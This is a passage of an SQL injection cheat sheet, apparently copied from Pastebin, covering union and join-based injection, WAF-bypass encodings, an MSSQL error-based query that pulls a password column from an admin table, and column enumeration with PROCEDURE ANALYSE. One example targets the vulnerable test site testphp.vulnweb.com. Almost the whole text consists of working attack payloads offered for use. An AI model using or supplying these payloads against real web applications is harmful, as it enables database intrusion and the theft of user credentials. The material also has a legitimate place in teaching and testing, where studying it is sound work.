+id=.58'limit 1,1 union select 0x3023,2,3-- -
+id=.58'limit 1,1 union select 1,0x3023,3-- -
+
+    id=.58'limit 1,1 union select 1,2,0x3023-- -
+
+
+4- •◘╚╦☆ The Join Syntax Multiple Queries Injection In Routed Query Mode ☆╚╦◘•
+
+Data hosted with ♥ by Pastebin.com - Download Raw - See Original
+
+&id=10 union select "@' union select * from (select Column_Number_1)Alias_Name join (select Column_Number_2)Alias_Name ETC %23"--%a0
+ 
+
+    http://testphp.vulnweb.com/listproducts.php?cat=@ union select "@' union select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d join (select 5)e join (select 6)f join (select 7)g join (select 8)h join (select 9)i join (select 10)j join (select 11)k %23"--%a0
+
+
+5- •◘╚╦☆ Adding Data By Using Encoding ☆╚╦◘•
+
+# Famous Issues #
+
+Data hosted with ♥ by Pastebin.com - Download Raw - See Original
+
+Using Hex | 0x123456 ,bypass for waf: x'123456'
+Using Character Chart | CONCAT(CHAR(104),CHAR(105))
+Using Binary | 0b123456
+
+    Using Seprate Letters | concat('H','i') ,bypass for waf: concat(0x12345,0x67890)
+
+
+6- •◘╚╦☆ if table only except number from pass column in Windows server ☆╚╦◘•
+
+Data hosted with ♥ by Pastebin.com - Download Raw - See Original
+
+&id=10+and+1=convert(int,(select+top+1+pass+from+admin))-- Not Work
+ 
+Solution = QUOTENAME ( 'character_string' [ , 'quote_character' ] )
+ 
+
+    &id=10+and+1=convert(int,(select+top+1+QUOTENAME(PASS,'''')+from+Table))-- Work Good
+
+
+7- •◘╚╦☆ Get Column NUmber ☆╚╦◘•
+
+Data hosted with ♥ by Pastebin.com - Download Raw - See Original
+
+&id=10 LIMIT 1,1 PROCEDURE ANALYSE() Get the first column's Number
+&id=10 LIMIT 1,1 PROCEDURE ANALYSE() Get the second column's Number
+&id=10 LIMIT 2,1 PROCEDURE ANALYSE() Get the third column's Number
+ 
+
+    ETC......
+
+
+
+•◘╚╦☆ End What We Will Share With You Hope You Wait More From Us Soon ☆╚╦◘•
+
+Big Regards For All my friend ^__^
+
+-----------------------------------------------------------------------------------------------------------------------------
+
+id=1 -2
+id=.10
+id=-10
+id=null
+id=9999
+id==10
+=10=10
+id=(-10) 
+
+id=polygon@
+id=polygon(point(53,12)) 
+
+A Polygon is a two-dimensional surface stored as a sequence of points defining an exterior bounding ring and zero or more interior rings, The function polygon() only work with the function point() & A MultiPolygon instance is a collection of zero or more Polygon instances.
+
+
+PHP Code
+2- And Polygon(Point(53,12))
+3- And Multipolygon(Point(53,12))
+4- And Linestring(Point(53,12))
+5- And Multilinestring(Point(53,12))
+6- And Geometrycollection(Point(53,12)) 
+"""
+
+
